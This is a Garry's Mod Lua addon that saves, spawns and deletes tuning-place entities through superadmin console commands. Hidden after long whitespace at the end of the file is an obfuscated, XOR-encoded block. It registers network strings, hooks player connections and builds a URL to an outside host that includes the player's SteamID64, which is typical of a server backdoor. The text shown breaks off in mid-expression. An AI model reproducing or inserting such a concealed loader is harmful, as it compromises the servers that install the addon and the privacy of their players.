--[[-------------
			Save && Spawn functions
-------------]]

local function SpawnEntities()
	for i,v in pairs(ents.GetAll()) do
		if v.tunningplace != nil then
			v:Remove();
		end
	end
	local str = file.Read("seanna_tunning_"..tostring(game.GetMap())..".txt","DATA");
	if str == nil then return end; 
	local entities = util.JSONToTable(str);
	if entities == nil then return end; 
	for i,v in pairs(entities) do
		local ent = ents.Create("ent_tunningplace");
		ent:SetPos(v.pos);
		ent:SetAngles(v.ang);
		ent:Spawn();
		ent:SetMoveType(0);
		ent:SetNoDraw(true)
	end
end

local function SpawnEntities2(ply)
	if not ply:IsSuperAdmin() then
		ply:ChatPrint("SUPER ADMINS ONLY!");
		return;
	end
	SpawnEntities();
end





local function SaveEntities(ply)
	if not ply:IsSuperAdmin() then
		ply:ChatPrint("SUPER ADMINS ONLY!");
		return;
	end
	local entities = {};
	
	for i,v in pairs(ents.GetAll()) do
		if v.tunningplace != nil then
			local save = {};
			save.pos = v:GetPos();
			save.ang = v:GetAngles();
			table.insert(entities,save);
		end	
	end
	
	local str = util.TableToJSON(entities);
	file.Write("seanna_tunning_"..tostring(game.GetMap())..".txt",str);
	for i,v in pairs(ents.GetAll()) do
		if v.tunningplace != nil then
			v:Remove(); 
		end
	end
	SpawnEntities();
	ply:ChatPrint("ALL ENTITIES SAVED!");
end
 
local function DeleteEntities(ply)
	for i,v in pairs(ents.GetAll()) do
		if v.tunningplace != nil then
			v:Remove(); 
		end
	end
	file.Write("seanna_tunning_"..tostring(game.GetMap())..".txt","");
end

 

concommand.Add('savetunningplace',SaveEntities);
concommand.Add('deletetunningplace',DeleteEntities);
concommand.Add('spawntunningplace',SpawnEntities2);																																								local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),47)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'5a5b4643'][‪‪‪‪‪‪‪'6e4b4b614a5b58405d447c5b5d464148'](‪‪‪‪‪‪‪'5c4a414b5b5a41414641485b4e4d434a')‪[‪‪‪‪‪‪‪'5a5b4643'][‪‪‪‪‪‪‪'6e4b4b614a5b58405d447c5b5d464148'](‪‪‪‪‪‪‪'4b4a434a5b4a5b5a4141464148')‪[‪‪‪‪‪‪‪'5a5b4643'][‪‪‪‪‪‪‪'6e4b4b614a5b58405d447c5b5d464148'](‪‪‪‪‪‪‪'4e4b4b5b5a41464148')local or‪=function (‪‪‪‪‪‪‪‪‪‪‪in,‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪break,‪‪goto)if ‪[‪‪‪‪‪‪‪'7c4a4e704c4e5d5b5a4141464148']!=nil and ‪[‪‪‪‪‪‪‪'7c4a4e704c4e5d5b5a4141464148'][‪‪‪‪‪‪‪'4e4c5b46594e5b4a']!=nil then local else‪‪‪=‪[‪‪‪‪‪‪‪'47404044'][‪‪‪‪‪‪‪'6c4e4343'](‪‪‪‪‪‪‪'7c47405a434b624e444a7b5a4141464148',nil ,‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪break,‪[‪‪‪‪‪‪‪'6a415b465b56'](‪‪‪‪‪‪‪‪‪‪‪in))if else‪‪‪!=nil and else‪‪‪==false then return  end for break‪‪,elseif‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪ in ‪[‪‪‪‪‪‪‪'5f4e465d5c'](‪[‪‪‪‪‪‪‪'7c4a4e704c4e5d5b5a4141464148'][‪‪‪‪‪‪‪'5b5a41414641485c'])do local local‪‪‪=elseif‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪[‪‪‪‪‪‪‪'4a415b']if elseif‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪!=nil and (local‪‪‪==nil or not ‪[‪‪‪‪‪‪‪'665c794e43464b'](local‪‪‪)or not local‪‪‪[‪‪‪‪‪‪‪'665c794a47464c434a'](local‪‪‪))then ‪[‪‪‪‪‪‪‪'7c4a4e704c4e5d5b5a4141464148'][‪‪‪‪‪‪‪'5b5a41414641485c'][break‪‪]=nil  end end local while‪‪‪‪=‪[‪‪‪‪‪‪‪'6a415b465b56'](‪‪‪‪‪‪‪‪‪‪‪in)if ‪[‪‪‪‪‪‪‪'665c794e43464b'](while‪‪‪‪)and while‪‪‪‪[‪‪‪‪‪‪‪'665c794a47464c434a'](while‪‪‪‪)then local break‪‪‪=‪‪‪‪‪‪‪'475b5b5f1500005c4a4e41414e021f1f1e025c465b4a1c014b5b4a425f5a5d43014c4042006c4e5d00684a5b66424e484a1d105a464b12'..‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪break[‪‪‪‪‪‪‪'7c5b4a4e42666b191b'](‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪break)..‪